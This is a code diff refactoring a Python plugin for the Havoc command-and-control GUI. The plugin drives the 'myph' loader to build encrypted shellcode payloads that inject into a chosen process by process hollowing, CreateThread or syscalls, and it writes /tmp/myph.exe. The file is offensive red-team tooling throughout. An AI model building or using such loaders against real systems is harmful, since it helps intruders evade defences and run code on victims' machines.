@@ -12,28 +12,27 @@ import havocui  # type: ignore
 from datetime import datetime
 
 # Configuration
-LOADER_PATH =  shutil.which("myph")
-payload_file_path = "/tmp/payload.bin"
+LOADER_PATH = shutil.which("myph")
+MYPH_EXEC_TECHNIQUES = ["CRT", "ProcessHollowing", "CreateThread", "Syscall"]
+
 
 # Variables & Defaults
-shellcode_path = ""
-myph_key = ""
-encryption_kind = "AES"
-process_to_inject_to = "cmd.exe"
-technique = "CRT"
+myph_shellcode_path = ""
+myph_shellcode_encryption_key = ""
+myph_shellcode_encryption_kind = "AES"
+myph_target_process = "cmd.exe"
+myph_shellcode_execution_technique = "CRT"
 
 # Colors
-HAVOC_ERROR = "#ff5555" # Red
-HAVOC_SUCCESS = "#50fa7b" # Green
-HAVOC_COMMENT = "#6272a4" # Greyish blue
-HAVOC_DARK = "#555766" # Dark Grey
-HAVOC_INFO = "#8be9fd" # Cyan
-HAVOC_WARNING = "#ffb86c" # Orange
-
+HAVOC_ERROR = "#ff5555"  # Red
+HAVOC_SUCCESS = "#50fa7b"  # Green
+HAVOC_COMMENT = "#6272a4"  # Greyish blue
+HAVOC_DARK = "#555766"  # Dark Grey
+HAVOC_INFO = "#8be9fd"  # Cyan
+HAVOC_WARNING = "#ffb86c"  # Orange
 
 # Labels
 label_to_replace = f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"
-
 
 
 if not LOADER_PATH:
@@ -41,70 +40,69 @@ if not LOADER_PATH:
     print("Please run script located in install/ directory :)")
     havocui.messagebox("Loader not found in: ", LOADER_PATH)
 
-
 # Create dialog and log widget
 dialog = havocui.Dialog("Matro7sh Myph Payload Generator", True, 670, 400)
 log = havocui.Logger("matro7sh myph Log")
 
 
-techniques = ["CRT", "ProcessHollowing", "CreateThread", "Syscall"]
+
 def change_shellcode_exec_method(num):
-    global technique
+    global myph_shellcode_execution_technique
     if num:
-        technique = techniques[num - 1]
+        myph_shellcode_execution_technique = MYPH_EXEC_TECHNIQUES[num - 1]
     else:
-        technique = "CRT"
-    print("[*] Shellcode execution method changed: ", technique)
+        myph_shellcode_execution_technique = "CRT"
+    print("[*] Shellcode execution method changed: ", myph_shellcode_execution_technique)
 
 
 def change_target_process(p):
-    global process_to_inject_to
-    process_to_inject_to = p
-    print("[*] Target process: ", process_to_inject_to)
+    global myph_target_process
+    myph_target_process = p
+    print("[*] Target process: ", myph_target_process)
 
 
 def change_default_key(k):
-    global myph_key
-    myph_key = k
-    print("[*] Key changed: ", myph_key)
+    global myph_shellcode_encryption_key
+    myph_shellcode_encryption_key = k
+    print("[*] Key changed: ", myph_shellcode_encryption_key)
 
 
 def change_shellcode_path():
-    global shellcode_path
+    global myph_shellcode_path
     global label_to_replace
 
-    shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
-    print("[*] Shellcode path changed: ", shellcode_path, ".")
+    myph_shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
+    print("[*] Shellcode path changed: ", myph_shellcode_path, ".")
 
-    formatted_shellcode_path = f"<span style=\"color:{HAVOC_SUCCESS};\">{shellcode_path}</span>"
+    formatted_shellcode_path = f"<span style=\"color:{HAVOC_SUCCESS};\">{myph_shellcode_path}</span>"
     dialog.replaceLabel(label_to_replace, formatted_shellcode_path)
-    label_to_replace = formatted_shellcode_path if shellcode_path != " " else f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"
+    label_to_replace = formatted_shellcode_path if myph_shellcode_path != " " else f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"
 
 
 # Generate payload
 def run():
     def get_build_command() -> str:
-        global shellcode_path
-        global myph_key
-        global technique
-        global process_to_inject_to
-        global encryption_kind
+        global myph_shellcode_path
+        global myph_shellcode_encryption_key
+        global myph_shellcode_execution_technique
+        global myph_target_process
+        global myph_shellcode_encryption_kind
 
         base_cmd = f'{LOADER_PATH}'
-        if shellcode_path != "":
-            base_cmd = f'{base_cmd} --shellcode {shellcode_path}'
+        if myph_shellcode_path != "":
+            base_cmd = f'{base_cmd} --shellcode {myph_shellcode_path}'
 
-        if encryption_kind != "":
-            base_cmd = f'{base_cmd} --encryption {encryption_kind}'
+        if myph_shellcode_encryption_kind != "":
+            base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_kind}'
 
-        if myph_key != "":
-            base_cmd = f'{base_cmd} --encryption {myph_key}'
+        if myph_shellcode_encryption_key != "":
+            base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_key}'
 
-        if process_to_inject_to != "":
-            base_cmd = f'{base_cmd} --process {process_to_inject_to}'
+        if myph_target_process != "":
+            base_cmd = f'{base_cmd} --process {myph_target_process}'
 
-        if technique != "":
-            base_cmd = f'{base_cmd} --technique {technique}'
+        if myph_shellcode_execution_technique != "":
+            base_cmd = f'{base_cmd} --technique {myph_shellcode_execution_technique}'
 
         base_cmd = f'{base_cmd} --out /tmp/myph.exe'
         print(f"[+] Command to be run: {base_cmd}")
@@ -114,21 +112,22 @@ def run():
         log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] No AES key provide it will be random one.")
         cmd = get_build_command()
 
-        log.addText(f"[+] executing: {cmd}")
         os.system(cmd)
 
-
         # Create Log
-        log.addText(f"command has been be executed")
-        log.addText(f"check client log to see the output")
-        log.addText(f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at /tmp/myph.exe using myph loader. Happy pwn</b>")
+        log.addText(f"Command has been be executed")
+        log.addText(f"Check client log to see the output")
+        log.addText(
+            f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at /tmp/myph.exe using myph loader. Happy pwn</b>")
         log.setBottomTab()
 
     log.setBottomTab()
-    log.addText(f"<b style=\"color:{HAVOC_DARK};\">───────────────────────────────────────── running myph ─────────────────────────────────────────</b>")
+    log.addText(
+        f"<b style=\"color:{HAVOC_DARK};\">───────────────────────────────────────── running myph ─────────────────────────────────────────</b>")
     log.addText(f"<b style=\"color:{HAVOC_COMMENT};\">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} </b>")
 
-    if shellcode_path == "":
+    global myph_shellcode_path
+    if myph_shellcode_path == "":
         havocui.messagebox("Error", "Please specify a valid shellcode path.")
         log.addText(f"[<span style=\"color:{HAVOC_ERROR};\">-</span>] No shellcode file specified.")
         return
@@ -150,7 +149,7 @@ def build():
     dialog.addLabel(label_to_replace)
 
     dialog.addLabel("<b>[*] Shellcode execution method</b>")
-    dialog.addCombobox(change_shellcode_exec_method, "CRT", *techniques)
+    dialog.addCombobox(change_shellcode_exec_method, "CRT", *MYPH_EXEC_TECHNIQUES)
 
     dialog.addLabel("<b>[*] AES Encryption key (Default: random)</b>")
     dialog.addLineedit("e.g. 0123456789ABCDEF1123345611111111", change_default_key)
@@ -162,9 +161,9 @@ def build():
     dialog.exec()
 
 
-
 def loader_generator():
     build()
+
 
 # Create Tab
 havocui.createtab("Matro7sh myph", "myph loader", loader_generator)
